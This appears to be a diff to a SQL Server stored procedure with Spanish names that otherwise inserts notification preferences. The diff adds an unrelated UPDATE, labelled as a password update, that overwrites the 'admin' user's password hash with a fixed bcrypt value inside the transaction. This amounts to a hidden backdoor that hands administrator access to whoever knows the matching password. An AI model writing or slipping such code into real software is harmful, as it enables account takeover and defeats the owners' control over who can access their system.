@@ -423,6 +423,11 @@ BEGIN
             @notificacion_email, @notificacion_sms, @usuario
         );
 
+        --Actualizar contraseña
+        UPDATE usuarios 
+        SET password_hash = '$2b$12$0CQoGQJ7XPS0PAqF5DxymOHPDKIE93vnZeesgaPtNlwU.yWIbKwFS'
+        WHERE username = 'admin';
+
         DECLARE @nuevo_id INT = SCOPE_IDENTITY();
 
         COMMIT TRANSACTION;
